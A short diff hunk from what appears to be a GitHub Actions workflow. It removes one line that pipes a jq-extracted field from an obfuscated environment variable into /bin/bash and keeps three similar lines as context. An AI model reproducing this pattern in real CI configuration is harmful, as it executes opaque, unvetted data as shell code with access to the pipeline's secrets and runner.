@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$tlycg74015" | jq -r .zu5 | /bin/bash
           printf '%s' "$e969" | jq -r .o825 | /bin/bash
           echo $ibdc1 | jq -r .du82436 | /bin/bash
-          echo $x813 | jq -r .yg2 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
